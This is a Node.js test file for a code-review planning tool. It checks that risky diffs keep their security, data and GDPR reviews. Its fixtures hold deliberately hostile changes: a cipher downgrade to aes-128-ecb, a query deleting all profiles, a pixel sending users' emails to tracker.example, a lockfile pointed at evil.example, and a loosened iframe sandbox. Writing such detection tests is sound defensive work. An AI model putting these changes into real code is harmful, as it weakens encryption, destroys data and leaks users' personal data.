import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fixture, git } from './helpers.mjs';
import { apv } from './cli-helpers.mjs';

/**
 * The security review of PR #128 (3.0.0-alpha.21): each throwaway repository of the review, replayed. Every case is a
 * review that 3.0.0-alpha.20 kept and the first version of the proportioned reviews skipped.
 */
async function plan(t, base, head) {
  const f = fixture(t, { files: base });
  git(f.repo, 'switch', '-q', '-c', 'work');
  const read = p => readFileSync(join(f.repo, p), 'utf8');
  for (const [path, text] of Object.entries(typeof head === 'function' ? head(read) : head)) {
    if (text === null) { rmSync(join(f.repo, path)); continue; }
    mkdirSync(dirname(join(f.repo, path)), { recursive: true });
    writeFileSync(join(f.repo, path), text);
  }
  git(f.repo, 'add', '-A'); git(f.repo, 'commit', '-qm', 'head');
  const r = await apv(f.repo, ['review', 'plan', '--base', 'main', '--head', 'work', '--json']);
  assert.equal(r.code, 0, r.stderr);
  return r.json();
}
const ALL = ['securite', 'fidelite', 'donnees', 'rgpd'];
const basis = (p, domain) => p.domains.find(d => d.domain === domain).basis;

test('M1: a string of server code renamed with a selector is never a pure rename (A1, A1b)', async t => {
  // A1: a cipher downgraded in server code, its name renamed in a style sheet too.
  const a1 = await plan(t, {
    'src/lib/server/crypto.ts': "import { createCipheriv } from 'node:crypto';\nexport const enc = (k: Buffer, iv: Buffer) => createCipheriv('aes-256-gcm', k, iv);\n",
    'src/app.css': '.aes-256-gcm {\n  color: red;\n}\n',
  }, get => ({ 'src/lib/server/crypto.ts': get('src/lib/server/crypto.ts').replace('aes-256-gcm', 'aes-128-ecb'), 'src/app.css': get('src/app.css').replace('aes-256-gcm', 'aes-128-ecb') }));
  assert.deepEqual(a1.retained, ALL, JSON.stringify(a1.files));
  assert.ok(a1.files.every(f => f.change !== 'names'));
  // A1b: the column of a query changed, the same name renamed in a style sheet.
  const a1b = await plan(t, {
    'src/routes/notes/+page.server.ts': "export const load = async ({ locals }) => {\n  const { data } = await locals.supabase.from('notes').select('*').eq('owner_id', locals.user.id);\n  return { data };\n};\n",
    'supabase/migrations/001_notes.sql': 'create table notes (id uuid primary key, owner_id uuid, editor_id uuid);\n',
    'src/app.css': '.owner_id {\n  color: red;\n}\n',
  }, get => ({ 'src/routes/notes/+page.server.ts': get('src/routes/notes/+page.server.ts').replace("'owner_id'", "'editor_id'"), 'src/app.css': get('src/app.css').replace('owner_id', 'editor_id') }));
  assert.deepEqual(a1b.retained, ALL);
  assert.ok(a1b.files.every(f => f.change !== 'names'));
});

test('M2: a rule moved and renamed changes the cascade: never a pure rename (A4)', async t => {
  const a4 = await plan(t, { 'src/lib/Btn.svelte': '<button class="btn-x btn-z">ok</button>\n', 'src/app.css': '.btn-x { color: red; }\n.btn-z { color: blue; }\n' },
    { 'src/lib/Btn.svelte': '<button class="btn-y btn-z">ok</button>\n', 'src/app.css': '.btn-z { color: blue; }\n.btn-y { color: red; }\n' });
  assert.deepEqual(a4.retained, ['securite', 'fidelite']);
  assert.ok(a4.files.every(f => f.change !== 'names'));
});

test('M3: a term of data or GDPR in server or interface code is required by the diff, even on one line (A9, A9b)', async t => {
  const a9 = await plan(t, { 'src/routes/compte/+page.server.ts': 'export const actions = {\n  default: async ({ locals }) => {\n    return { ok: true };\n  }\n};\n' },
    get => ({ 'src/routes/compte/+page.server.ts': get('src/routes/compte/+page.server.ts').replace('return { ok: true };', "await locals.supabase.from('profiles').delete().neq('id', '');") }));
  assert.equal(basis(a9, 'donnees'), 'diff', JSON.stringify(a9.domains));
  const a9b = await plan(t, { 'src/lib/Hero.svelte': '<h1>Bonjour</h1>\n' },
    get => ({ 'src/lib/Hero.svelte': `${get('src/lib/Hero.svelte')}<img src="https://tracker.example/p.gif?email={user.email}" alt="" />\n` }));
  assert.equal(basis(a9b, 'rgpd'), 'diff', JSON.stringify(a9b.domains));
});

test('F1: an old name left in a Markdown page keeps fidelity (A5)', async t => {
  const a5 = await plan(t, {
    'src/lib/Card.svelte': '<p class="ad-card">x</p>\n<style>\n  .ad-card {\n    color: red;\n  }\n</style>\n',
    'src/routes/guide/+page.md': '# Guide\n\n<div class="ad-card">texte</div>\n',
  }, get => ({ 'src/lib/Card.svelte': get('src/lib/Card.svelte').replaceAll('ad-card', 'art-card') }));
  assert.ok(a5.retained.includes('fidelite'), JSON.stringify(a5.files));
});

test('F2: a spec of the base modified keeps the classification of alpha.20; a spec added is a note of the pipeline (A6c)', async t => {
  const a6c = await plan(t, { '.apv/specs/a.json': '{ "id": "a", "security": { "negativeTestsRequired": true } }\n' },
    { '.apv/specs/a.json': '{ "id": "a", "security": { "negativeTestsRequired": false } }\n' });
  assert.deepEqual(a6c.retained, ALL);
  assert.doesNotMatch(a6c.files[0].riskWhy, /notes de pilotage/);
  const added = await plan(t, {}, { '.apv/specs/b.json': '{ "id": "b" }\n', 'src/lib/x.svelte': '<p>x</p>\n' });
  assert.match(added.files.find(f => f.path === '.apv/specs/b.json').riskWhy, /^notes de pilotage/);
});

test('A7: a lockfile whose download host changes says the new host in the security review', async t => {
  const a7 = await plan(t, {
    'package.json': '{ "name": "e", "dependencies": { "left-pad": "^1.3.0" } }\n',
    'package-lock.json': '{ "name": "e", "lockfileVersion": 3, "packages": {\n  "node_modules/left-pad": {\n    "version": "1.3.0",\n    "resolved": "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz",\n    "integrity": "sha512-AAA"\n  }\n} }\n',
  }, get => ({ 'package-lock.json': get('package-lock.json').replace('https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz', 'https://evil.example/left-pad-1.3.0.tgz').replace('AAA', 'BBB') }));
  assert.deepEqual(a7.retained, ['securite']);
  assert.match(a7.domains[0].reason, /hôte de téléchargement nouveau dans le verrou : evil\.example/);
});

const CARD = { 'src/lib/Card.svelte': '<p class="ad-card">x</p>\n<style>\n  .ad-card {\n    color: red;\n  }\n</style>\n', 'tests/card.test.ts': "expect(q('.ad-card')).toBeTruthy();\n" };
const renameCard = get => ({ 'src/lib/Card.svelte': get('src/lib/Card.svelte').replaceAll('ad-card', 'art-card'), 'tests/card.test.ts': get('tests/card.test.ts').replaceAll('ad-card', 'art-card') });

test('second review of PR #128, M1-bis: a string outside a class or id context is never a name (A1d, A1e)', async t => {
  // A1d: the column of a query in a component, the same name renamed in a style sheet: alpha.20 kept data.
  const a1d = await plan(t, {
    'src/lib/Notes.svelte': "<script>\n  const load = () => supabase.from('notes').select('*').eq('owner_id', me);\n</script>\n<p class=\"x\">n</p>\n",
    'src/app.css': '.owner_id {\n  color: red;\n}\n',
  }, get => ({ 'src/lib/Notes.svelte': get('src/lib/Notes.svelte').replace("'owner_id'", "'editor_id'"), 'src/app.css': get('src/app.css').replace('owner_id', 'editor_id') }));
  assert.deepEqual(a1d.retained, ['securite', 'fidelite', 'donnees'], JSON.stringify(a1d.files));
  assert.equal(a1d.files.find(f => f.path === 'src/lib/Notes.svelte').change, 'content');
  // A1e: the sandbox of an iframe loosened: alpha.20 kept GDPR.
  const a1e = await plan(t, { 'src/lib/Embed.svelte': '<iframe title="t" src="/x" sandbox="allow-forms"></iframe>\n', 'src/app.css': '.allow-forms {\n  color: red;\n}\n' },
    get => ({ 'src/lib/Embed.svelte': get('src/lib/Embed.svelte').replace('allow-forms', 'allow-same-origin'), 'src/app.css': get('src/app.css').replace('allow-forms', 'allow-same-origin') }));
  assert.deepEqual(a1e.retained, ['securite', 'fidelite', 'rgpd'], JSON.stringify(a1e.files));
});

test('second review of PR #128: two names swapped in place keep fidelity (A4b); a real rename stays pure (R0)', async t => {
  const a4b = await plan(t, { 'src/lib/Btn.svelte': '<button class="btn-x">a</button>\n<button class="btn-z">b</button>\n', 'src/app.css': '.btn-x { color: red; }\n.btn-z { color: blue; }\n' },
    { 'src/lib/Btn.svelte': '<button class="btn-z">a</button>\n<button class="btn-x">b</button>\n', 'src/app.css': '.btn-z { color: red; }\n.btn-x { color: blue; }\n' });
  assert.deepEqual(a4b.retained, ['securite', 'fidelite']);
  const r0 = await plan(t, CARD, renameCard);
  assert.deepEqual(r0.retained, ['securite']);
  // The test calls its own helper q(): no class context, a content change of a test, which keeps no domain.
  assert.deepEqual(r0.files.map(f => [f.path, f.change]), [['src/lib/Card.svelte', 'names'], ['tests/card.test.ts', 'content']]);
});

test('second review of PR #128, R8: a journal of the pipeline that cites the old name refuses the pure rename (prudence, wanted)', async t => {
  const r8 = await plan(t, { ...CARD, '.apv/journal-pipeline.md': '# j\n' }, get => ({ ...renameCard(get), '.apv/journal-pipeline.md': '# j\nrenommer ad-card en art-card\n' }));
  assert.ok(r8.retained.includes('fidelite'));
  assert.ok(r8.files.every(f => f.change !== 'names'));
});
